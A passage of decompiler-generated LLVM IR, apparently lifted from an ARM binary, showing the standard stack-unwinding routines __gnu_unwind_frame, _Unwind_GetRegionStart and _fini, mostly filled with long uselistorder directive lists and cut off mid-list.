  uselistorder i32* @r7, { 394, 395, 396, 398, 399, 397, 400, 401, 402, 403, 0, 404, 405, 406, 418, 407, 408, 409, 410, 411, 412, 5, 413, 414, 415, 416, 417, 3, 1, 419, 69, 70, 71, 72, 108, 109, 110, 111, 112, 113, 420, 73, 6, 74, 75, 76, 7, 77, 78, 79, 80, 8, 81, 82, 9, 83, 84, 85, 10, 86, 87, 88, 89, 90, 11, 91, 92, 93, 94, 95, 12, 96, 97, 98, 99, 53, 54, 13, 55, 56, 57, 58, 59, 60, 14, 61, 62, 63, 64, 65, 66, 67, 68, 100, 104, 101, 102, 103, 105, 106, 107, 114, 115, 382, 383, 344, 345, 267, 268, 421, 422, 423, 424, 434, 435, 226, 227, 228, 229, 122, 123, 124, 125, 425, 426, 427, 428, 307, 308, 309, 310, 311, 384, 385, 386, 387, 174, 175, 15, 51, 52, 346, 347, 352, 353, 354, 355, 356, 357, 358, 348, 349, 350, 351, 327, 328, 329, 330, 331, 332, 359, 360, 361, 362, 363, 364, 365, 366, 16, 367, 368, 369, 312, 313, 314, 315, 316, 317, 280, 283, 284, 285, 281, 282, 269, 270, 271, 272, 273, 126, 129, 130, 131, 127, 128, 176, 177, 132, 133, 286, 289, 290, 291, 287, 288, 292, 293, 134, 137, 138, 139, 135, 136, 191, 192, 193, 194, 195, 200, 201, 202, 203, 196, 197, 198, 199, 204, 205, 206, 207, 208, 209, 178, 179, 140, 141, 142, 143, 144, 145, 210, 211, 388, 389, 146, 17, 147, 148, 429, 18, 430, 431, 432, 433, 212, 213, 214, 215, 216, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 45, 46, 34, 30, 19, 31, 2, 32, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 47, 48, 49, 50, 159, 160, 161, 162, 163, 164, 165, 116, 117, 118, 119, 120, 121, 166, 167, 168, 169, 170, 171, 172, 173, 180, 181, 20, 182, 183, 184, 185, 186, 187, 188, 189, 190, 217, 218, 219, 220, 221, 222, 223, 224, 225, 230, 231, 232, 233, 234, 235, 236, 237, 21, 238, 239, 240, 241, 242, 243, 244, 245, 22, 246, 247, 248, 24, 23, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 28, 262, 263, 264, 265, 266, 274, 29, 275, 276, 277, 278, 279, 26, 25, 294, 295, 296, 297, 298, 299, 4, 300, 301, 302, 303, 304, 305, 306, 318, 319, 320, 321, 322, 323, 324, 325, 326, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 372, 370, 371, 27, 373, 374, 375, 376, 377, 378, 379, 380, 381, 390, 391, 392, 393 }
  uselistorder i32* @lr, { 5, 0, 190, 191, 192, 193, 201, 194, 195, 196, 197, 3, 198, 199, 200, 202, 203, 204, 205, 206, 207, 209, 210, 7, 8, 211, 212, 213, 214, 215, 216, 217, 218, 219, 11, 12, 13, 14, 15, 16, 17, 18, 19, 9, 10, 20, 220, 221, 223, 224, 225, 230, 85, 86, 36, 37, 228, 229, 145, 146, 187, 188, 189, 222, 226, 227, 162, 163, 164, 165, 166, 155, 156, 157, 167, 180, 181, 168, 169, 170, 171, 172, 173, 174, 4, 175, 176, 178, 179, 177, 147, 148, 139, 140, 132, 133, 38, 39, 6, 182, 183, 74, 75, 76, 77, 78, 79, 40, 41, 208, 80, 184, 87, 42, 43, 44, 45, 46, 47, 1, 51, 52, 53, 54, 55, 56, 48, 49, 50, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 2, 32, 33, 34, 35, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 81, 82, 83, 84, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 134, 135, 136, 137, 138, 141, 142, 143, 144, 149, 150, 151, 152, 153, 154, 158, 159, 160, 161, 185, 186 }
  uselistorder i32* @r6, { 498, 499, 500, 511, 501, 29, 502, 5, 503, 504, 6, 505, 506, 507, 508, 509, 510, 512, 1, 513, 514, 97, 98, 95, 96, 99, 515, 516, 7, 517, 518, 519, 520, 82, 83, 100, 8, 101, 102, 103, 104, 105, 25, 106, 107, 108, 9, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 80, 81, 84, 85, 86, 87, 10, 88, 89, 90, 11, 91, 92, 93, 94, 121, 30, 122, 26, 12, 13, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 487, 488, 489, 490, 523, 491, 14, 492, 493, 74, 15, 75, 16, 76, 521, 522, 440, 444, 445, 446, 447, 441, 442, 443, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 448, 473, 474, 475, 449, 450, 451, 452, 453, 17, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 469, 471, 465, 466, 467, 468, 470, 472, 144, 145, 2, 146, 398, 399, 360, 361, 362, 363, 364, 353, 354, 147, 148, 149, 150, 151, 365, 366, 367, 368, 369, 152, 153, 154, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 155, 156, 157, 158, 159, 160, 161, 162, 163, 257, 18, 258, 259, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 33, 60, 188, 189, 190, 191, 192, 193, 194, 61, 195, 62, 63, 64, 65, 66, 34, 35, 36, 55, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 56, 0, 57, 58, 59, 67, 68, 69, 70, 71, 72, 73, 196, 197, 4, 3, 198, 199, 200, 201, 202, 203, 204, 27, 205, 206, 207, 208, 209, 216, 217, 218, 219, 220, 210, 211, 212, 213, 214, 215, 134, 135, 19, 136, 137, 138, 139, 140, 141, 142, 143, 269, 270, 271, 272, 221, 222, 223, 224, 225, 226, 227, 231, 77, 78, 79, 228, 229, 230, 20, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 260, 261, 262, 263, 28, 264, 265, 266, 21, 267, 268, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 31, 22, 312, 313, 315, 316, 314, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 355, 356, 357, 358, 359, 370, 371, 32, 23, 372, 373, 375, 376, 374, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 24, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 494, 495, 496, 497 }
  uselistorder label %dec_label_pc_199a8, { 1, 0 }
  uselistorder label %dec_label_pc_19944, { 1, 0 }
  uselistorder label %dec_label_pc_198f0, { 1, 0 }
  uselistorder label %dec_label_pc_198c8, { 1, 0 }
  uselistorder label %dec_label_pc_19834, { 1, 0 }
  uselistorder label %dec_label_pc_19818, { 1, 0 }
  uselistorder label %dec_label_pc_197fc, { 1, 0 }
  uselistorder label %dec_label_pc_197ac, { 1, 0 }
  uselistorder label %dec_label_pc_19790, { 1, 0 }
  uselistorder label %dec_label_pc_1970c, { 1, 0 }
  uselistorder label %dec_label_pc_196f0, { 1, 0 }
  uselistorder label %dec_label_pc_1962c, { 2, 4, 5, 3, 0, 6, 7, 1 }
  uselistorder label %dec_label_pc_195fc, { 3, 4, 5, 0, 6, 2, 7, 1, 10, 11, 8, 9 }
  uselistorder label %dec_label_pc_195e4, { 1, 0 }
  uselistorder label %dec_label_pc_195c8, { 1, 0 }
  uselistorder label %dec_label_pc_1932c.backedge, { 2, 6, 4, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_19454, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_19448, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1943c, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %dec_label_pc_193ec, { 1, 0 }
  uselistorder label %dec_label_pc_193dc, { 1, 0 }
  uselistorder label %dec_label_pc_19368, { 2, 1, 0 }
}

define i32 @__gnu_unwind_frame(i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %uws_-20 = alloca %anon_struct_13.3, align 8
  %v1_19a30 = add i32 %ucbp, 76
  %v2_19a30 = inttoptr i32 %v1_19a30 to i32*
  %v3_19a30 = load i32, i32* %v2_19a30, align 4
  %v1_19a34 = add i32 %v3_19a30, 4
  %v2_19a34 = inttoptr i32 %v1_19a34 to i32*
  %v3_19a34 = load i32, i32* %v2_19a34, align 4
  %v3_19a3c = mul i32 %v3_19a34, 256
  %v4_19a44 = getelementptr inbounds %anon_struct_13.3, %anon_struct_13.3* %uws_-20, i32 0, i32 0
  store i32 %v3_19a3c, i32* %v4_19a44, align 8
  %tmp7 = bitcast %anon_struct_13.3* %uws_-20 to %anon_struct_13*
  %v4_19a64 = call i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %tmp7)
  ret i32 %v4_19a64

; uselistorder directives
  uselistorder %anon_struct_13.3* %uws_-20, { 1, 0 }
  uselistorder i32 (i32, %anon_struct_13*)* @__gnu_unwind_execute, { 1, 0 }
  uselistorder i32 256, {}
  uselistorder i32 4, { 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 110, 513, 514, 515, 516, 517, 5, 520, 521, 518, 519, 522, 6, 523, 524, 525, 526, 7, 543, 8, 527, 528, 529, 530, 531, 9, 532, 10, 533, 534, 535, 536, 537, 538, 539, 11, 540, 148, 541, 542, 544, 545, 546, 547, 12, 548, 13, 260, 261, 262, 263, 279, 280, 549, 241, 242, 445, 247, 264, 14, 15, 552, 16, 17, 93, 88, 89, 18, 553, 90, 554, 73, 19, 20, 91, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 21, 572, 573, 574, 575, 576, 577, 72, 578, 579, 580, 581, 582, 583, 22, 23, 92, 584, 272, 111, 270, 271, 265, 266, 267, 268, 269, 243, 244, 245, 246, 248, 249, 250, 251, 252, 253, 24, 254, 112, 255, 256, 257, 258, 259, 149, 273, 274, 275, 276, 277, 278, 25, 281, 282, 283, 284, 325, 326, 285, 286, 287, 585, 26, 150, 113, 151, 587, 27, 588, 152, 239, 586, 84, 496, 497, 498, 499, 153, 74, 449, 450, 451, 452, 453, 454, 154, 155, 28, 455, 456, 457, 458, 459, 460, 461, 462, 156, 447, 448, 420, 421, 422, 423, 424, 425, 426, 427, 428, 29, 429, 430, 431, 463, 30, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 157, 158, 159, 478, 479, 482, 485, 480, 481, 114, 160, 483, 64, 484, 486, 487, 488, 490, 161, 32, 31, 489, 162, 163, 164, 295, 33, 34, 165, 65, 35, 36, 327, 328, 329, 330, 331, 37, 332, 75, 550, 551, 214, 38, 39, 115, 296, 76, 232, 116, 233, 120, 121, 166, 234, 297, 298, 40, 299, 94, 117, 118, 229, 235, 236, 119, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 0, 230, 231, 237, 238, 122, 68, 67, 300, 85, 301, 41, 302, 42, 70, 69, 304, 43, 303, 305, 306, 311, 123, 313, 124, 314, 125, 315, 316, 312, 307, 126, 308, 309, 310, 288, 167, 289, 66, 44, 290, 291, 45, 292, 77, 86, 127, 293, 294, 406, 317, 83, 82, 81, 318, 128, 46, 47, 48, 49, 50, 51, 319, 79, 78, 320, 80, 129, 321, 322, 323, 168, 240, 130, 324, 52, 333, 334, 335, 169, 336, 337, 338, 339, 170, 171, 131, 340, 132, 341, 95, 342, 343, 344, 172, 345, 346, 173, 174, 347, 96, 348, 97, 349, 350, 175, 351, 352, 176, 177, 353, 133, 354, 98, 355, 178, 179, 180, 356, 357, 134, 99, 358, 359, 181, 360, 361, 362, 182, 183, 1, 135, 363, 100, 364, 365, 366, 184, 367, 368, 185, 186, 2, 136, 369, 101, 370, 102, 371, 372, 373, 374, 187, 375, 376, 188, 189, 377, 378, 137, 379, 3, 380, 103, 381, 138, 382, 383, 384, 385, 190, 386, 387, 191, 192, 388, 389, 139, 390, 4, 391, 104, 392, 140, 393, 193, 194, 195, 394, 395, 141, 105, 396, 397, 398, 399, 196, 400, 401, 197, 198, 143, 402, 142, 403, 106, 404, 107, 405, 407, 408, 409, 410, 411, 145, 412, 146, 413, 199, 414, 71, 415, 200, 201, 147, 416, 144, 417, 108, 418, 109, 419, 202, 53, 432, 203, 54, 433, 204, 55, 434, 205, 56, 435, 206, 57, 436, 207, 87, 58, 437, 438, 208, 59, 439, 209, 60, 440, 210, 61, 441, 211, 62, 442, 212, 63, 443, 444, 446, 491, 492, 493, 494, 495, 500, 213, 501, 502 }
  uselistorder i32 76, { 18, 19, 20, 21, 22, 23, 0, 3, 5, 4, 6, 2, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 1 }
  uselistorder i32 1, { 763, 1368, 1369, 588, 1373, 1374, 1375, 1376, 629, 1377, 1378, 547, 563, 630, 1370, 1371, 1372, 1379, 589, 1380, 764, 100, 98, 96, 94, 99, 95, 97, 765, 766, 767, 768, 631, 632, 1381, 1382, 530, 771, 770, 769, 231, 233, 232, 234, 236, 235, 774, 773, 772, 126, 633, 634, 125, 1383, 121, 1384, 777, 776, 775, 120, 1385, 1386, 1387, 1388, 779, 778, 106, 108, 109, 107, 110, 136, 137, 539, 780, 402, 1053, 781, 403, 404, 405, 782, 122, 1054, 1055, 1056, 279, 278, 280, 281, 783, 117, 784, 347, 344, 345, 343, 346, 785, 594, 1026, 76, 77, 75, 74, 73, 1389, 564, 635, 1390, 1, 0, 786, 327, 323, 321, 322, 328, 326, 329, 324, 325, 320, 65, 636, 133, 787, 407, 408, 406, 548, 587, 549, 1312, 1313, 1314, 1315, 565, 788, 409, 790, 789, 410, 411, 1032, 791, 1057, 1058, 1059, 1392, 1061, 1060, 531, 792, 552, 1062, 553, 1393, 1028, 1027, 1394, 554, 1395, 1396, 1397, 1398, 1399, 1400, 988, 1401, 1402, 1403, 1404, 1405, 1406, 989, 756, 794, 793, 412, 416, 418, 414, 413, 415, 417, 419, 421, 420, 1066, 1063, 1064, 1065, 584, 555, 364, 365, 366, 367, 637, 1067, 1068, 1083, 1084, 795, 757, 63, 64, 1075, 990, 1076, 1077, 991, 1078, 1079, 1080, 1081, 1082, 60, 54, 55, 57, 61, 58, 56, 59, 53, 62, 1069, 1070, 1071, 638, 1072, 1073, 1074, 796, 425, 428, 426, 422, 430, 423, 424, 427, 429, 1085, 1086, 1087, 797, 217, 216, 213, 212, 211, 218, 214, 215, 219, 1088, 1089, 1090, 1091, 798, 315, 316, 314, 319, 317, 318, 799, 342, 1030, 639, 1029, 585, 802, 801, 800, 502, 508, 500, 504, 503, 507, 505, 506, 509, 501, 640, 1031, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 556, 803, 511, 510, 512, 516, 513, 514, 515, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 804, 32, 36, 38, 35, 33, 37, 34, 39, 641, 1043, 805, 197, 1092, 1093, 1094, 1095, 1096, 642, 806, 350, 351, 352, 354, 353, 643, 355, 807, 72, 71, 68, 69, 70, 66, 67, 808, 140, 141, 148, 149, 144, 145, 146, 147, 142, 143, 809, 277, 275, 276, 810, 431, 811, 349, 348, 812, 116, 115, 813, 83, 82, 814, 1188, 180, 183, 181, 182, 432, 138, 139, 815, 131, 130, 816, 93, 817, 818, 334, 335, 1407, 1408, 1409, 644, 1410, 1411, 645, 1412, 821, 820, 819, 150, 152, 158, 151, 156, 155, 159, 157, 153, 154, 822, 305, 646, 823, 433, 434, 435, 824, 441, 439, 440, 438, 436, 437, 825, 103, 104, 102, 105, 101, 826, 827, 259, 829, 828, 127, 830, 284, 160, 1361, 833, 832, 831, 123, 124, 834, 111, 113, 112, 114, 557, 835, 88, 524, 532, 1362, 836, 165, 162, 163, 164, 166, 161, 1363, 1364, 1365, 837, 443, 442, 446, 449, 448, 447, 445, 451, 444, 450, 452, 179, 540, 1023, 1024, 1025, 838, 839, 550, 1159, 551, 1160, 1161, 541, 1162, 454, 458, 453, 456, 457, 460, 461, 459, 455, 1163, 1413, 566, 647, 841, 840, 842, 1317, 1320, 1321, 1322, 843, 462, 467, 468, 466, 465, 469, 463, 464, 1323, 1324, 1325, 1326, 844, 474, 480, 473, 479, 478, 472, 481, 482, 476, 470, 475, 471, 477, 1318, 1319, 648, 330, 332, 331, 132, 1301, 649, 1302, 1303, 1304, 1305, 1306, 845, 79, 80, 78, 81, 1327, 135, 134, 1328, 1329, 1330, 1331, 1332, 1333, 595, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 1341, 651, 1342, 1343, 1344, 1345, 1346, 650, 1347, 1348, 1349, 1350, 1351, 846, 485, 487, 483, 486, 491, 494, 490, 492, 493, 488, 489, 484, 274, 273, 652, 653, 545, 850, 849, 848, 847, 171, 167, 558, 239, 851, 272, 271, 852, 337, 336, 853, 170, 854, 495, 855, 856, 496, 857, 238, 858, 497, 859, 860, 498, 861, 258, 257, 862, 256, 255, 168, 863, 129, 128, 864, 865, 499, 866, 85, 84, 867, 522, 868, 1215, 1216, 91, 92, 993, 994, 995, 996, 997, 998, 999, 1414, 40, 41, 42, 43, 869, 1189, 654, 30, 31, 1097, 870, 363, 362, 655, 1190, 871, 368, 369, 656, 872, 380, 378, 379, 1191, 873, 19, 18, 17, 874, 119, 118, 875, 876, 90, 89, 877, 237, 878, 517, 879, 333, 880, 200, 199, 881, 285, 883, 882, 282, 283, 885, 884, 221, 222, 196, 525, 1391, 397, 396, 1192, 1193, 1194, 1195, 538, 1196, 887, 886, 52, 51, 46, 49, 47, 48, 44, 45, 50, 2, 1164, 1165, 1166, 1167, 1217, 559, 1218, 560, 1219, 889, 888, 518, 1197, 1198, 1199, 1200, 890, 1308, 1309, 567, 3, 535, 4, 1310, 1098, 1099, 1100, 657, 1201, 519, 1352, 169, 1203, 1202, 1204, 341, 1220, 270, 1235, 891, 187, 186, 185, 184, 1221, 892, 401, 400, 399, 398, 658, 1018, 659, 1019, 596, 1020, 1127, 661, 1128, 1021, 1005, 1000, 663, 546, 1001, 1002, 664, 1003, 1004, 668, 1006, 1007, 1008, 665, 1009, 1010, 669, 1011, 1012, 666, 1013, 1014, 667, 662, 1015, 1016, 1017, 670, 671, 1022, 569, 672, 673, 1129, 1130, 1131, 674, 1132, 1133, 1134, 675, 568, 1135, 992, 1138, 1137, 660, 1136, 1139, 1140, 676, 1141, 1142, 1143, 570, 1150, 1151, 542, 677, 905, 904, 903, 902, 901, 900, 899, 898, 897, 896, 895, 894, 893, 228, 227, 226, 225, 229, 230, 1144, 1145, 678, 1146, 1147, 679, 1148, 1149, 244, 243, 242, 248, 245, 246, 247, 241, 240, 680, 681, 907, 906, 520, 521, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 526, 537, 1108, 1109, 571, 527, 1110, 1111, 1112, 1113, 528, 536, 1114, 1115, 572, 529, 1116, 682, 1117, 1118, 683, 1119, 684, 1120, 1121, 561, 1124, 1122, 1123, 533, 534, 1125, 685, 1126, 915, 759, 914, 913, 912, 911, 910, 909, 758, 908, 384, 385, 388, 381, 386, 383, 382, 387, 916, 210, 1293, 578, 562, 917, 28, 27, 26, 25, 29, 23, 21, 20, 22, 24, 1222, 919, 918, 267, 268, 266, 265, 264, 263, 269, 688, 597, 1152, 1153, 598, 1154, 1155, 686, 687, 689, 1156, 1157, 690, 691, 692, 693, 694, 695, 696, 932, 931, 930, 929, 928, 927, 926, 925, 924, 923, 762, 922, 921, 920, 261, 262, 260, 697, 543, 698, 933, 699, 700, 701, 704, 703, 702, 1158, 935, 934, 356, 705, 1168, 583, 1169, 582, 1170, 581, 1171, 580, 1172, 579, 1173, 1174, 706, 586, 707, 1175, 708, 1176, 709, 1177, 710, 1178, 711, 1179, 712, 1180, 713, 1181, 714, 1182, 715, 1183, 716, 1184, 717, 1185, 718, 1186, 719, 1187, 544, 720, 948, 947, 946, 945, 944, 943, 942, 941, 940, 939, 938, 937, 936, 357, 358, 361, 359, 360, 1205, 1211, 6, 573, 1206, 721, 1207, 5, 1208, 590, 1209, 574, 575, 1210, 1212, 1213, 591, 1214, 760, 952, 951, 761, 950, 949, 198, 1294, 599, 600, 1295, 7, 8, 9, 1223, 1224, 1225, 1226, 1227, 592, 593, 722, 1228, 1229, 723, 1230, 1231, 724, 1232, 1234, 1233, 956, 955, 954, 953, 308, 310, 312, 313, 311, 306, 309, 307, 1236, 1237, 1238, 725, 726, 958, 957, 250, 253, 254, 249, 252, 251, 1239, 1240, 1241, 727, 1242, 728, 602, 601, 729, 1243, 959, 288, 291, 292, 293, 290, 286, 289, 287, 1244, 1245, 730, 1246, 603, 576, 731, 960, 303, 304, 1247, 1248, 1249, 732, 1250, 733, 734, 1251, 604, 1252, 961, 189, 193, 194, 195, 192, 188, 191, 190, 1253, 1254, 1255, 735, 1256, 736, 606, 605, 737, 1257, 738, 1258, 962, 297, 300, 301, 302, 299, 294, 298, 295, 296, 1259, 1260, 1261, 1262, 1263, 739, 1264, 740, 1265, 741, 611, 610, 742, 1266, 607, 1267, 608, 1268, 609, 1269, 968, 967, 966, 965, 964, 963, 394, 391, 392, 395, 389, 390, 393, 1270, 1271, 1272, 1273, 1274, 743, 1275, 744, 1276, 745, 620, 619, 746, 1277, 618, 1278, 617, 1279, 612, 1280, 613, 1281, 614, 1282, 615, 1283, 616, 1284, 974, 973, 972, 971, 970, 969, 175, 176, 178, 177, 172, 174, 173, 1285, 1286, 747, 1287, 621, 577, 748, 975, 223, 224, 1288, 1289, 1290, 749, 624, 623, 750, 1291, 622, 1292, 976, 370, 371, 375, 376, 377, 374, 373, 372, 1296, 1297, 1298, 751, 627, 626, 752, 1299, 625, 1300, 981, 980, 979, 978, 977, 201, 202, 207, 208, 209, 206, 205, 204, 203, 1307, 628, 753, 982, 338, 339, 340, 1311, 983, 220, 1316, 984, 10, 1353, 1356, 754, 1357, 1358, 1354, 1355, 1359, 1360, 12, 13, 15, 14, 11, 16, 1366, 755, 985, 86, 1367, 87, 986, 987, 523 }
}

define i32 @_Unwind_GetRegionStart(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_19a90 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_19a98 = add i32 %tmp1, 72
  %v2_19a98 = inttoptr i32 %v1_19a98 to i32*
  %v3_19a98 = load i32, i32* %v2_19a98, align 4
  ret i32 %v3_19a98

; uselistorder directives
  uselistorder i32 72, { 10, 11, 0, 12, 2, 3, 1, 4, 7, 8, 5, 6, 9 }
  uselistorder i32 (i32, i32, i32, i32, i8*)* @_Unwind_VRS_Get, { 10, 8, 7, 6, 5, 9, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 0, 3, 4, 7, 5, 6, 1, 2, 8, 14, 13, 10, 11, 9, 12, 15, 16, 17 }
  uselistorder i32 12, { 9, 8, 11, 10, 174, 175, 176, 177, 15, 16, 66, 17, 178, 58, 12, 179, 180, 181, 182, 183, 185, 186, 184, 187, 188, 189, 190, 191, 192, 193, 18, 19, 20, 21, 23, 22, 24, 59, 60, 25, 26, 61, 62, 63, 64, 65, 67, 68, 90, 69, 70, 194, 6, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 3, 128, 129, 130, 131, 132, 27, 133, 151, 28, 29, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 170, 163, 164, 165, 166, 167, 168, 169, 171, 172, 30, 173, 4, 91, 92, 31, 93, 94, 95, 32, 71, 33, 72, 43, 53, 54, 55, 73, 74, 56, 44, 45, 46, 47, 48, 49, 50, 51, 52, 57, 34, 35, 36, 75, 76, 77, 7, 78, 79, 80, 81, 83, 84, 42, 85, 37, 86, 38, 87, 89, 88, 82, 5, 123, 96, 39, 97, 98, 99, 100, 101, 102, 103, 40, 104, 105, 106, 41, 107, 108, 109, 110, 111, 112, 13, 113, 114, 115, 116, 117, 118, 14, 119, 120, 121, 122, 124, 125, 126, 127, 0, 1, 2 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_19aac = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_19aac)
  %v31_19ab4 = load i32, i32* @r0, align 4
  ret i32 %v31_19ab4

; uselistorder directives
  uselistorder i32* @r0, { 13, 14, 15, 247, 248, 249, 16, 42, 78, 89, 250, 253, 254, 69, 17, 251, 252, 229, 48, 8, 255, 9, 18, 79, 0, 80, 10, 11, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 1, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 81, 19, 70, 71, 72, 73, 74, 75, 76, 77, 82, 83, 84, 85, 86, 87, 88, 45, 245, 46, 246, 20, 21, 22, 23, 171, 172, 282, 283, 285, 59, 60, 61, 62, 24, 195, 196, 2, 25, 26, 94, 95, 3, 27, 28, 286, 287, 4, 29, 30, 215, 216, 5, 31, 32, 67, 68, 284, 156, 90, 231, 33, 56, 57, 232, 6, 233, 234, 235, 223, 54, 224, 225, 226, 55, 227, 228, 34, 243, 236, 237, 238, 239, 240, 241, 242, 96, 97, 35, 217, 36, 218, 209, 37, 210, 205, 38, 206, 98, 39, 99, 211, 40, 212, 100, 41, 101, 102, 43, 44, 173, 174, 175, 176, 103, 47, 104, 49, 50, 177, 178, 179, 180, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 65, 141, 63, 64, 66, 142, 145, 146, 147, 148, 149, 150, 143, 144, 91, 92, 93, 52, 151, 152, 153, 154, 155, 157, 158, 53, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 181, 182, 183, 184, 185, 186, 187, 12, 188, 189, 190, 191, 192, 193, 194, 219, 220, 7, 197, 198, 199, 200, 201, 202, 203, 204, 207, 208, 213, 214, 221, 222, 230, 244, 58, 51 }
  uselistorder void (i32)* @__pseudo_branch, { 1, 68, 61, 62, 63, 64, 65, 66, 67, 69, 70, 71, 72, 17, 18, 19, 20, 21, 22, 13, 14, 15, 16, 23, 24, 25, 26, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 27, 28, 29, 73, 78, 79, 80, 81, 82, 83, 84, 74, 88, 89, 90, 91, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 39, 75, 76, 77, 85, 86, 87, 40, 41, 42, 0, 36, 37, 38, 43, 47, 48, 44, 45, 46, 92, 30, 31, 32, 33, 34, 35, 59, 60 }
  uselistorder i32 0, { 441, 440, 504, 505, 1406, 445, 444, 506, 1407, 1408, 1409, 1410, 387, 386, 507, 1411, 1412, 209, 1413, 1415, 1416, 153, 154, 1417, 1418, 1414, 97, 98, 99, 100, 2, 1, 3, 0, 198, 197, 199, 200, 201, 1419, 442, 443, 147, 142, 1420, 1421, 203, 204, 202, 205, 1422, 1423, 1424, 1425, 208, 207, 206, 1426, 1427, 1428, 431, 430, 508, 446, 509, 447, 510, 448, 511, 512, 513, 155, 1429, 462, 461, 1430, 1431, 460, 459, 1432, 514, 457, 458, 455, 456, 454, 453, 1433, 452, 451, 450, 449, 394, 1434, 1450, 1435, 212, 1436, 1437, 1438, 1439, 1440, 1441, 214, 1443, 1444, 210, 211, 1445, 1446, 131, 156, 1447, 1448, 706, 101, 102, 432, 433, 213, 1442, 1449, 393, 1451, 515, 516, 1452, 464, 463, 215, 1453, 1454, 216, 1455, 1456, 1457, 113, 517, 518, 1458, 217, 1459, 157, 1460, 1461, 218, 1462, 1463, 1464, 1465, 1466, 1467, 1468, 1469, 1470, 1471, 39, 132, 519, 1472, 219, 1473, 1474, 1475, 4, 1476, 1477, 5, 1478, 1479, 925, 926, 6, 148, 1480, 520, 1481, 839, 840, 841, 842, 843, 847, 844, 845, 846, 7, 395, 103, 848, 521, 849, 850, 851, 465, 466, 927, 928, 8, 522, 784, 523, 1482, 1483, 1484, 9, 10, 158, 159, 160, 1499, 1500, 11, 785, 161, 162, 1317, 1318, 1319, 1320, 220, 221, 1321, 794, 222, 133, 49, 1501, 104, 396, 1505, 1506, 50, 852, 114, 853, 854, 855, 397, 163, 1502, 1503, 1504, 398, 12, 1507, 1508, 1509, 1510, 1511, 1514, 1515, 1516, 1517, 1518, 1519, 1520, 1521, 1522, 1523, 1512, 1513, 1524, 1525, 1526, 1527, 1528, 1529, 1530, 1531, 40, 1532, 1533, 1534, 1535, 1536, 41, 1537, 1538, 1539, 42, 1540, 1541, 1542, 43, 1543, 1544, 1545, 1546, 1547, 1548, 1549, 1550, 1551, 1552, 1553, 1554, 1555, 1556, 1557, 1558, 1559, 1560, 1561, 1562, 1563, 1564, 1565, 1566, 1569, 1570, 1571, 1572, 1573, 1574, 1575, 1567, 1568, 1576, 1577, 1578, 1579, 1580, 1581, 1582, 1583, 1584, 1585, 44, 